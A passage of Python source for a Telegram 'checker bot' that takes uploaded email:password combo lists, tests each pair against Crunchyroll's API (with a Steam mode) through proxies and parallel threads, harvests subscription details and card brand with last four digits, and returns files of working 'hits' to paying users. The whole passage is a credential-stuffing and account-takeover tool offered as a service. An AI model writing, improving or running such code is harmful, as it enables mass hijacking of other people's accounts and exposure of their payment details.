                result['email_verified'] = 'Yes' if acc_data.get('email_verified') else 'No'
                if acc_data.get('created'):
                    result['account_creation'] = acc_data['created'].split('T')[0]
                external_id = acc_data.get('external_id')

                if external_id:
                    # Subscription
                    subs_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if subs_resp.status_code == 200:
                        subs_data = subs_resp.json()
                        result['active'] = 'Yes' if subs_data.get('is_active') else 'No'
                        result['expiry'] = subs_data.get('next_renewal_date', '').split('T')[0] if subs_data.get('next_renewal_date') else ''
                        result['country'] = subs_data.get('country_code', 'ZZ')

                    # Products
                    prod_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products",
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if prod_resp.status_code == 200:
                        items = prod_resp.json().get('items', [])
                        if items:
                            product = items[0].get('product', {})
                            result['plan'] = product.get('sku', 'None')
                            result['currency'] = items[0].get('currency_code', 'N/A')
                            result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'False'
                            result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'False'

                    # ================== IMPROVED PAYMENT EXTRACTION v3 ==================
                    payment_method = "Unknown"
                    card_brand = ""
                    last4 = ""

                    def find_payment_info(data):
                        nonlocal payment_method, card_brand, last4
                        if isinstance(data, dict):
                            for k, v in data.items():
                                key_lower = k.lower()
                                v_str = str(v).lower() if v is not None else ""
                                if key_lower in ['payment_method', 'payment_type', 'method', 'billing_method', 'type']:
                                    if isinstance(v, str) and v.strip() and v.lower() not in ['none', 'null', '']:
                                        payment_method = v.strip().capitalize()
                                if any(x in key_lower for x in ['brand', 'card_brand', 'card_type', 'issuer']) and isinstance(v, str) and v.strip():
                                    card_brand = v.strip().capitalize()
                                if any(x in key_lower for x in ['last4', 'last_four', 'last4digits', 'last_digits']) and isinstance(v, (str, int)):
                                    last4 = str(v).strip().zfill(4)
                                if any(term in v_str for term in ['visa', 'mastercard', 'amex', 'discover', 'paypal', 'apple', 'google', 'stripe']):
                                    if isinstance(v, str) and v.strip():
                                        payment_method = v.strip().capitalize()
                                find_payment_info(v)
                        elif isinstance(data, list):
                            for item in data:
                                find_payment_info(item)

                    # Check benefits
                    benefits_resp = requests.get(
                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                        headers=acc_headers, proxies=proxies, timeout=25
                    )
                    if benefits_resp.status_code == 200:
                        try:
                            benefits_json = benefits_resp.json()
                            find_payment_info(benefits_json)
                        except:
                            pass

                    # Check products (very important for payment info)
                    if prod_resp.status_code == 200:
                        try:
                            prod_json = prod_resp.json()
                            find_payment_info(prod_json)
                        except:
                            pass

                    # Raw text fallback
                    if payment_method == "Unknown" or not (card_brand and last4):
                        raw_text = ""
                        if benefits_resp.status_code == 200:
                            raw_text += benefits_resp.text
                        if prod_resp.status_code == 200:
                            raw_text += prod_resp.text
                        brand_match = re.search(r'"brand"\s*:\s*"([^"]+)"', raw_text, re.I)
                        last4_match = re.search(r'"last4"\s*:\s*["\']?(\d{4})["\']?', raw_text, re.I)
                        if brand_match and last4_match:
                            card_brand = brand_match.group(1).capitalize()
                            last4 = last4_match.group(1)
                        elif re.search(r'paypal|apple.*pay|google.*pay|stripe', raw_text, re.I):
                            match = re.search(r'paypal|apple.*pay|google.*pay|stripe', raw_text, re.I)
                            if match:
                                payment_method = match.group(0).capitalize()

                    # Final payment result
                    if card_brand and last4:
                        result['payment_method'] = f"{card_brand} •••• {last4}"
                    elif payment_method != "Unknown":
                        result['payment_method'] = payment_method
                    else:
                        result['payment_method'] = "Unknown / Third-party"
                    # ====================================================================

                    # Plan & Max Streams (kept from your original code)
                    if benefits_resp.status_code == 200:
                        benefits_data = benefits_resp.text
                        benefit_match = re.search(r'"benefit":"concurrent_streams\.(\d+)"', benefits_data)
                        if benefit_match:
                            streams = benefit_match.group(1)
                            if streams == "6":
                                result['plan_sub'] = "ULTIMATE FAN MEMBER"
                                result['max_streams'] = "6"
                            elif streams == "4":
                                result['plan_sub'] = "MEGA FAN MEMBER"
                                result['max_streams'] = "4"
                            elif streams == "1":
                                result['plan_sub'] = "FAN MEMBER"
                                result['max_streams'] = "1"
                            else:
                                result['plan_sub'] = f"UNKNOWN ({streams})"
                                result['max_streams'] = streams

            # Username
            profile_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile",
                                      headers=acc_headers, proxies=proxies, timeout=25)
            if profile_resp.status_code == 200:
                profile_data = profile_resp.text
                username_match = re.search(r'"username":"(.*?)"', profile_data)
                if username_match:
                    result['username'] = username_match.group(1)

            # Final decision
            if result['active'] == 'Yes':
                result['success'] = True
                result['message'] = 'ACTIVE SUBSCRIPTION!'
            else:
                result['message'] = 'Valid account but no paid plan'

            return result

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt + random.uniform(0.5, 2))
                continue
            result['message'] = f'Error: {str(e)[:80]}'
            return result

    return result

async def start(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return

    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    stats = get_user_stats(user_id)

    # Update name info if missing
    if not stats.get('username') and username:
        update_user_stats(user_id, {"username": username, "first_name": first_name})
    

    reset_daily_if_needed(stats, user_id)
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)

    # File statistics for dashboard
    max_files = limits.get("multi_scan_max_files", 1)
    today_files = stats.get("today_files", 0)

    files_display = format_files_display(today_files, max_files, stats.get("plan", "FREE"))
    
    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = f"""
<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_proxyless_banner()}
📤 <b>Send your combo list (.txt file)</b>
<i>Format: mail:pass (one per line)</i>
━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{limits['current_threads']}/{limits['max_threads']}</b></code>
📁 Files Today: <code><b>{files_display}</b></code>
👑 Plan: <code><b>{get_plan_with_emoji(stats.get('plan'))}</b></code>
📅 Days Left: <code><b>{get_days_remaining(stats['expires'])}</b></code>
📈 Daily Limit: <code><b>{limits['remaining_text']} combos</b></code>
📡 Mode: <code><b>{get_mode_display(stats.get('api_mode'))}</b></code>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    context.user_data['in_main_menu'] = True

    await update.message.reply_text(
        welcome,
        parse_mode='HTML',
        reply_markup=reply_markup,
        reply_to_message_id=update.message.message_id
    )

async def process_thread_count_input(update: Update, context: CallbackContext):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    try:
        new_threads = int(text)
        stats = get_user_stats(user_id)
        limits = get_plan_limits(stats)
        max_allowed = limits["max_threads"]
        plan_name = limits["display_name"]

        if 1 <= new_threads <= max_allowed:
            # Update in database
            update_user_stats(user_id,{
                "threads": new_threads
            })
            
            # Show confirmation
            await update.message.reply_text(
                f"✅ <b>Thread count updated to {new_threads} for your account.</b>",
                parse_mode='HTML'
            )
            
            # Clear waiting state
            context.user_data['waiting_for_threads'] = False
            
            # Redirect back to main menu
            await edit_to_main_menu(update, context)
            
        else:
            await update.message.reply_text(
                f"❌ Your plan <b>{get_plan_with_emoji(stats.get('plan'))}</b> allows a maximum of <b>{max_allowed}</b> threads.",
                parse_mode='HTML'
            )
            return

    except ValueError:
        await update.message.reply_text(
            "❌ Invalid number! Send a number only.",
            parse_mode='HTML'
        )
        return

async def handle_message(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return
    
    user_id = update.effective_user.id  # ← get once, use everywhere

    if context.user_data.get('waiting_for_threads'):
        await process_thread_count_input(update, context)
        return
    
    is_on_main_menu = context.user_data.get('in_main_menu', False)
    text = update.message.text.strip()
    looks_like_combo = ':' in text
    
    # 🔥 NEW: Only trigger single checker when on the main dashboard
    if is_on_main_menu:
        if looks_like_combo:
            parts = text.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()

            stats = get_user_stats(user_id)
            reset_daily_if_needed(stats, user_id)
            stats = get_user_stats(user_id)
            limits = get_plan_limits(stats)
            
            if limits["daily_limit"] is not None:
                if stats["today_scans"] + 1 > limits["daily_limit"]:
                    await update.message.reply_text(
                        f"<b>❌ Daily limit reached!</b>\n\n"
                        f"You have already used <b>{stats['today_scans']}/{limits['daily_limit']}</b> scans today.\n"
                        f"Upgrade your plan or wait until tomorrow.",
                        parse_mode='HTML'
                    )
                    return
                
            # ====================== RATE LIMITER FOR SINGLE CHECKS ======================
            # Same logic as bulk files
            mode_name = stats.get("api_mode", "Crunchyroll")
            if mode_name == "Steam":
                max_rps = 3 if limits["display_name"] == "FREE" else 5 if "BASIC" in limits["display_name"] else 8
            elif limits["display_name"] == "FREE":
                max_rps = 12
            elif "BASIC" in limits["display_name"]:
                max_rps = 22
            else:
                max_rps = 32
            rate_limiter = RateLimiter(max_rps=max_rps)
            rate_limiter.acquire()   # ← This was missing!
            
            status_msg = await update.message.reply_text(
                f"🔍 <b>Checking Account</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📧 <code>{email}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📌 🔍 Connecting to server...\n"
                f"⚡ Progress: <b>0%</b>",
                parse_mode='HTML'
            )
            try:
                stop_event = asyncio.Event()

                # Use correct checker based on user's selected mode
                mode = stats.get("api_mode", "Crunchyroll")

                # Run progress animation + checker at the same time
                progress_task = asyncio.create_task(
                    animate_progress(status_msg, email, stop_event)
                )
                
                checker = get_checker_function(mode, user_id)
                result = await run_blocking(checker, email, password)
                
                # Stop the animation
                stop_event.set()
                progress_task.cancel()
                
                # Show 100% briefly before result
                await status_msg.edit_text(
                    f"🔍 <b>Checking Account</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📧 <code>{email}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ Done!\n"
                    f"⚡ Progress: <b>100%</b>",
                    parse_mode='HTML'
                )
                await asyncio.sleep(0.5)

                # Get current user's plan + mode
                stats = get_user_stats(user_id)
                user_plan = stats.get("plan", "FREE").upper()
                mode = stats.get("api_mode", "Crunchyroll")

                response = format_single_result(result, user_plan, mode)
                await status_msg.edit_text(response, parse_mode='HTML')

            except Exception as e:
                await status_msg.edit_text(
                    f"❌ <b>Check Failed</b>\n\n"
                    f"📧 <b>Account:</b> <code>{email}</code>\n"
                    f"⚠️ <b>Error:</b> <code>{str(e)[:100]}</code>\n\n"
                    f"Please try again.",
                    parse_mode='HTML'
                )
                print(f"[ERROR] format_single_result crashed: {e}")
                return
            
            # AUTO PIN THE RESULT
            await manage_result_pin(update, context, status_msg.message_id)
            
            hits_increment = 1 if result.get('success') else 0
            bad_increment = 1 if not result.get('success') else 0
            twofa_increment = 1 if result.get('twofa') else 0

            update_user_stats(user_id, {
                "total_scans": stats.get("total_scans", 0) + 1,
                "total_hits": stats.get("total_hits", 0) + hits_increment,
                "total_free": stats.get("total_free", 0) + bad_increment,
                "total_2fa": stats.get("total_2fa", 0) + twofa_increment,
                "today_scans": stats.get("today_scans", 0) + 1
            })
            return
        else:
            await update.message.reply_text(
                """❌ <b>Invalid Format!</b>
    ━━━━━━━━━━━━━━━━━━━━━━━━
    Send like this:
    <code>email:password</code>
    <b>Example:</b>
    <code>user@example.com:supersecret123</code>
    ━━━━━━━━━━━━━━━━━━━━━━━━
    💡 You can also send a <b>.txt file</b> with multiple accounts (one per line).""",
                parse_mode='HTML'
            )
            return
    else:
        warning = await update.message.reply_text(
            """🚧 You can only check accounts from the home dashboard.""",
            parse_mode='HTML'
        )
        await asyncio.sleep(3)
        await warning.delete()
        return

async def handle_document(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return

    document = update.message.document
    is_on_main_menu = context.user_data.get('in_main_menu', False)
    
    if not is_on_main_menu:
        warning = await update.message.reply_text(
            """🚧 You can only check accounts from the home dashboard.""",
            parse_mode='HTML'
        )
        await asyncio.sleep(3)
        await warning.delete()
        return
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ Please send a .txt file only!", 
            parse_mode='HTML',
            reply_to_message_id=update.message.message_id
        )
        return
    
    user_id = update.effective_user.id
    
    # ==================== BLOCK BULK UPLOAD FOR FREE PLAN ====================
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)

    if limits["display_name"] == "FREE":
        await update.message.reply_text(
            f"❌ <b>FREE Plan limitation</b>\n\n"
            f"Bulk file upload is not available on FREE plan.\n"
            f"Please use single checks (<code>email:password</code>) or upgrade to BASIC/VIP.",
            parse_mode='HTML',
            reply_to_message_id=update.message.message_id
        )
        return
    # =====================================================================

    # Paid users (BASIC+) continue with normal file limit check
    max_files = limits.get("multi_scan_max_files", 1)
    reset_daily_if_needed(stats, user_id)
    stats = get_user_stats(user_id)

    if stats.get("today_files", 0) >= max_files:
        await update.message.reply_text(
            f"❌ <b>Daily file limit reached!</b>\n\n"
            f"Your <b>{limits['display_name']}</b> plan allows only <b>{max_files}</b> file{'' if max_files == 1 else 's'} per day.\n\n"
            f"Come back tomorrow or upgrade your plan.",
            parse_mode='HTML',
            reply_to_message_id=update.message.message_id
        )
        return
    
    # ====================== Normal file processing ======================
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    lines = file_content.decode('utf-8', errors='ignore').splitlines()

    accounts = []
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append((email.strip(), pwd.strip()))
    
    if not accounts:
        await update.message.reply_text(
            "❌ No valid accounts found!", 
            parse_mode='HTML',
            reply_to_message_id=update.message.message_id
        )
        return

    total = len(accounts)

    # Daily scan limit check
    if limits["daily_limit"] is not None:
        used = stats.get("today_scans", 0)
        remaining = limits["daily_limit"] - used
        if total > remaining:
            await update.message.reply_text(
                f"❌ <b>Error!</b> Maximum allowed combos per day for your plan is <code>{remaining}</code>. Your file contains <code>{total}</code> combos.",
                parse_mode='HTML',
                reply_to_message_id=update.message.message_id
            )
            return

    # Increment counters
    update_user_stats(user_id, {"today_files": stats.get("today_files", 0) + 1})
    update_user_stats(user_id, {"total_combo_files": stats.get("total_combo_files", 0) + 1})
        
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    user_threads = limits["current_threads"]

    # ====================== NEW PROGRESS FORMAT (your requested design) ======================

    scan_id = str(uuid.uuid4())[:8]
    context.user_data['current_scan'] = {
        'scan_id': scan_id,
        'progress_msg': None,
        'stop_requested': False
    }

    # 3 buttons in ONE clean row
    keyboard = [[
        InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_scan:{scan_id}"),
        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # === YOUR EXACT REQUESTED PROGRESS MESSAGE ===
    progress_msg = await update.message.reply_text(
        f"📊 <b>Scan In Progress</b> 🔄\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 File: <code>{document.file_name}</code>\n"
        f"🔢 <b>Processed:</b> <code>0/{total}</code> (<code>0%</code>)\n"
        f"🧵 <b>Threads:</b> <code>{user_threads}</code>\n"
        f"📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Hits:</b> <code>0</code>\n"
        f"❌ Bad: <code>0</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ <b>Elapsed:</b> <code>00m 00s</code>\n"
        f"⚡ <b>CPM:</b> <code>0</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"— Controls:\n"
        f"Pause\n"
        f"Resume\n"
        f"Stop and send results\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML',
        reply_markup=reply_markup
    )
    context.user_data['current_scan']['progress_msg'] = progress_msg

    set_scan_status(scan_id, "running")

    # ====================== Start scanning ======================
    hits = []
    start_time = time.time()

    mode_name = stats.get("api_mode", "Crunchyroll")
    if mode_name == "Steam":
        max_rps = 8 if limits["display_name"] == "FREE" else 12 if "BASIC" in limits["display_name"] else 18
    elif limits["display_name"] == "FREE":
        max_rps = 12
    elif "BASIC" in limits["display_name"]:
        max_rps = 22
    else:
        max_rps = 32
    rate_limiter = RateLimiter(max_rps=max_rps)

    def check_account(acc):
        """Worker that polls Supabase for pause/cancel"""
        # Check before doing anything
        status = get_scan_status(scan_id)
        if status == "stopped":
            return None

        # Wait while paused BEFORE starting this account
        pause_start = time.time()
        while True:
            status = get_scan_status(scan_id)
            if status == "running":
                break
            if status == "stopped":
                return None
            # Auto-stop after 10 minutes of being paused
            if time.time() - pause_start > 600:
                set_scan_status(scan_id, "stopped")
                return None
            time.sleep(0.3)

        email, pwd = acc

        # Check again after pause wait
        if get_scan_status(scan_id) == "stopped":
            return None

        rate_limiter.acquire()

        # Check again after rate limiter (can block for a bit)
        status = get_scan_status(scan_id)
        if status == "stopped":
            return None

        # Wait while paused AGAIN (in case paused during rate limiter wait)
        pause_start = time.time()
        while True:
            status = get_scan_status(scan_id)
            if status == "running":
                break
            if status == "stopped":
                return None
            if time.time() - pause_start > 600:  # ✅ ADD THIS
                set_scan_status(scan_id, "stopped")
                return None
            time.sleep(0.3)

        mode = stats.get("api_mode", "Crunchyroll")
        checker = get_checker_function(mode, user_id)
        result = checker(email, pwd)

        # Check after the HTTP request completes
        if get_scan_status(scan_id) == "stopped":
            return None

        # Wait while paused AFTER result (before returning to queue)
        pause_start = time.time()
        while True:
            status = get_scan_status(scan_id)
            if status == "running":
                break
            if status == "stopped":
                return None
            if time.time() - pause_start > 600:  # ✅ ADD THIS
                set_scan_status(scan_id, "stopped")
                return None
            time.sleep(0.3)

        return result

    completed = 0

    loop = asyncio.get_running_loop()

    with concurrent.futures.ThreadPoolExecutor(max_workers=user_threads) as executor:
        futures = [
            loop.run_in_executor(executor, check_account, acc)
            for acc in accounts
        ]
        
        for coro in asyncio.as_completed(futures):
            scan_status = get_scan_status(scan_id)
            if scan_status == "stopped":
                break

            # When paused, hold the main loop too (stops progress updates)
            pause_start_main = time.time()
            while scan_status == "paused":
                await asyncio.sleep(0.5)
                scan_status = get_scan_status(scan_id)
                if scan_status == "stopped":
                    break
                # Auto-stop after 10 minutes of being paused
                if time.time() - pause_start_main > 600:
                    set_scan_status(scan_id, "stopped")
                    break

            if scan_status == "stopped":
                break

            result = await coro  # ← await lets other callbacks run between results
            completed += 1
            
            if result and result.get('success'):
                hits.append(result)
            
            # Update progress every 10 accounts (or at the end) → fixes "Query too old" error
            if completed % 5 == 0 or completed == total:
                elapsed_sec = int(time.time() - start_time)
                cpm = int((completed / elapsed_sec) * 60) if elapsed_sec > 0 else 0
                percent = int((completed / total) * 100)
                bad_so_far = completed - len(hits)

                context.user_data['current_scan']['last_progress'] = {
                    'file_name': document.file_name,
                    'completed': completed,
                    'total': total,
                    'hits': len(hits),
                    'bad': bad_so_far,
                    'elapsed_sec': elapsed_sec,
                    'cpm': cpm,
                    'percent': percent,
                    'threads': user_threads,
                    'mode': get_mode_display(stats.get('api_mode'))
                }

                current_status = get_scan_status(scan_id)
                if current_status == "paused":
                    status_title = "📊 <b>Scan Paused</b> ⏸️ (Auto-resume in 30s)"
                    keyboard = [[
                        InlineKeyboardButton("▶️ Resume", callback_data=f"resume_scan:{scan_id}"),
                        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
                    ]]
                else:
                    status_title = "📊 <b>Scan In Progress</b> 🔄"
                    keyboard = [[
                        InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_scan:{scan_id}"),
                        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
                    ]]

                reply_markup = InlineKeyboardMarkup(keyboard)

                try:
                    await progress_msg.edit_text(
                        f"{status_title}\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📁 File: <code>{document.file_name}</code>\n"
                        f"🔢 <b>Processed:</b> <code>{completed}/{total}</code> (<code>{percent}%</code>)\n"
                        f"🧵 <b>Threads:</b> <code>{user_threads}</code>\n"
                        f"📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ <b>Hits:</b> <code>{len(hits)}</code>\n"
                        f"❌ Bad: <code>{bad_so_far}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"⏱ <b>Elapsed:</b> <code>{elapsed_sec//60:02d}m {elapsed_sec%60:02d}s</code>\n"
                        f"⚡ <b>CPM:</b> <code>{cpm}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"— Controls:\n"
                        f"Pause\n"
                        f"Resume\n"
                        f"Stop and send results\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━",
                        parse_mode='HTML',
                        reply_markup=reply_markup
                    )
                except:
                    pass  # Telegram rate limit or message deleted

    # ====================== CLEANUP & FINISH ======================
    final_status = get_scan_status(scan_id)
    hits_count = len(hits)
    bad_count = completed - hits_count
    current_stats = get_user_stats(user_id)
    twofa_count_bulk = len([h for h in hits if h.get('twofa')])

    if final_status == "stopped" and completed < total:
            elapsed_sec = int(time.time() - start_time)
            cpm = int((completed / elapsed_sec) * 60) if elapsed_sec > 0 else 0
            percent = int((completed / total) * 100)

            mode_name_stop = stats.get("api_mode", "Crunchyroll")
            if mode_name_stop == "Steam":
                twofa_stop = len([h for h in hits if h.get('twofa')])
                normal_stop = hits_count - twofa_stop
                hit_line_stop = f"✅ <b>Hits:</b> <code>{hits_count}</code> (<code>{normal_stop} Normal + {twofa_stop} 2FA</code>)"
            else:
                hit_line_stop = f"✅ <b>Hits:</b> <code>{hits_count}</code>"

            await progress_msg.edit_text(
                f"📊 <b>Scan Stopped ✅</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📁 File: <code>{document.file_name}</code>\n"
                f"🔢 <b>Processed:</b> <code>{completed}/{total}</code> (<code>{percent}%</code>)\n"
                f"🧵 <b>Threads:</b> <code>{user_threads}</code>\n"
                f"📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{hit_line_stop}\n"
                f"❌ <b>Bad:</b> <code>{bad_count}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏱ <b>Elapsed:</b> <code>{elapsed_sec//60:02d}m {elapsed_sec%60:02d}s</code>\n"
                f"⚡ <b>CPM:</b> <code>{cpm}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode='HTML'
            )
            await manage_result_pin(update, context, progress_msg.message_id)
    else:   
        # ====================== IMPROVED SUMMARY WITH 2FA BREAKDOWN ======================
        elapsed = int(time.time() - start_time)
        cpm = int((total / elapsed) * 60) if elapsed > 0 else 0

        mode_name = stats.get("api_mode", "Crunchyroll")
        
        if mode_name == "Steam":
            twofa_count = len([hit for hit in hits if hit.get('twofa')])
            normal_hits = hits_count - twofa_count
            
            hit_line = f"✅ <b>HITS:</b> <code>{hits_count}</code> (<code>{normal_hits} Normal + {twofa_count} 2FA</code>)"
            twofa_line = f"🔐 <b>2FA Required:</b> <code>{twofa_count}</code>\n" if twofa_count > 0 else ""
        else:
            hit_line = f"✅ <b>HITS:</b> <code>{hits_count}</code>"
            twofa_line = ""

        summary = f"""
<b>📊 Scan Completed ✅</b>
━━━━━━━━━━━━━━━━━━━━━━━━
📁 <b>File:</b> <code>{document.file_name}</code>
📊 <b>Processed:</b> <code>{completed}/{total}</code>
🧵 <b>Threads:</b> <code>{user_threads}</code>
📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{hit_line}
{twofa_line}❌ <b>BAD:</b> <code>{bad_count}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
⏱ <b>Elapsed:</b> <code>{elapsed}s</code>
⚡ <b>CPM:</b> <code>{cpm}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
"""
        await progress_msg.edit_text(summary, parse_mode='HTML')
        await manage_result_pin(update, context, progress_msg.message_id)

    update_user_stats(user_id, {
        "total_scans": current_stats["total_scans"] + completed,
        "total_hits": current_stats["total_hits"] + hits_count,
        "total_free": current_stats.get("total_free", 0) + bad_count,
        "total_2fa": current_stats.get("total_2fa", 0) + twofa_count_bulk,
        "today_scans": current_stats["today_scans"] + completed
    })

    # ====================== HITS + BAD + 2FA FILES (mode-aware) ======================
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    mode_name = stats.get("api_mode", "Crunchyroll")
    
    if hits_count > 0:
        current_stats = get_user_stats(user_id)
        user_plan = current_stats.get("plan", "FREE").upper()

        hits_text = f"🎉 {mode_name.upper()} HITS - {user_plan} PLAN\n" + "="*70 + "\n\n"
        for hit in hits:
            hits_text += format_hit_for_file(hit, user_plan, mode_name)

        hits_file = f"/tmp/{mode_name.lower()}_hits_{timestamp}.txt"
        with open(hits_file, "w", encoding="utf-8") as f:
            f.write(hits_text)

        fancy_caption = f"""
👍 <b>{hits_count}x {mode_name} Hits</b>
────────────────────────
☰ BY @caydigitals ✅
────────────────────────
<a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/caydigitals">Admin</a>
        """.strip()

        await update.message.reply_document(
            document=open(hits_file, "rb"),
            filename=f"{mode_name} Hits @caydigitals.txt",
            caption=fancy_caption,
            parse_mode='HTML'
        )

    # === Save separate 2FA file for Steam ===
    if mode_name == "Steam":
        twofa_accounts = [hit for hit in hits if hit.get('twofa')]
        if twofa_accounts:
            twofa_text = f"🔐 STEAM 2FA ACCOUNTS - {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
            twofa_text += "="*60 + "\n\n"
            for acc in twofa_accounts:
                twofa_text += f"{acc['email']}:{acc['password']} | SteamID: {acc.get('steamid','N/A')}\n"
            
            twofa_file = f"/tmp/steam_2fa_{timestamp}.txt"
            with open(twofa_file, "w", encoding="utf-8") as f:
                f.write(twofa_text)

            await update.message.reply_document(
                document=open(twofa_file, "rb"),
                filename=f"Steam 2FA @caydigitals.txt",
                caption=f"🔐 {len(twofa_accounts)}x Steam Accounts with 2FA",
                parse_mode='HTML'
            )

    if bad_count > 0:
        hit_emails = {hit['email'] for hit in hits}
        bad_lines = [f"{email}:{pwd} | Check_By = @caydigitals" for email, pwd in accounts if email not in hit_emails]
        
        bad_text = f"❌ BAD ACCOUNTS | {mode_name}\n"
        bad_text += f"{'='*40}\n"
        bad_text += "\n".join(bad_lines)
        
        bad_file = f"/tmp/{mode_name.lower()}_bad_{timestamp}.txt"
        with open(bad_file, "w", encoding="utf-8") as f:
            f.write(bad_text)

        bad_caption = f"""
❌ <b>{bad_count}x Bad Accounts</b>
────────────────────────────
☰ BY @caydigitals ✅
────────────────────────────
<a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/caydigitals">Admin</a>
        """.strip()

        await update.message.reply_document(
            document=open(bad_file, "rb"),
            filename=f"{mode_name} Bad @caydigitals.txt",
            caption=bad_caption,
            parse_mode='HTML'
        )

    # Cleanup
    delete_scan(scan_id)
    if 'current_scan' in context.user_data:
        del context.user_data['current_scan']

async def edit_to_main_menu(update_or_query, context):
    context.user_data['in_main_menu'] = True
    """Smart function that works for BOTH callback buttons and normal messages"""
    # ←←← IMPORTANT: Clear waiting state when returning to main menu
    if 'waiting_for_threads' in context.user_data:
        context.user_data['waiting_for_threads'] = False

    # Get user_id from either Update or CallbackQuery
    if hasattr(update_or_query, 'callback_query') and update_or_query.callback_query is not None:
        user_id = update_or_query.callback_query.from_user.id
    elif hasattr(update_or_query, 'from_user') and update_or_query.from_user is not None:
        user_id = update_or_query.from_user.id
    else:
        user_id = update_or_query.effective_user.id

    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    # File statistics for dashboard
    max_files = limits.get("multi_scan_max_files", 1)
    today_files = stats.get("today_files", 0)

    files_display = format_files_display(today_files, max_files, stats.get("plan", "FREE"))

    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = f"""
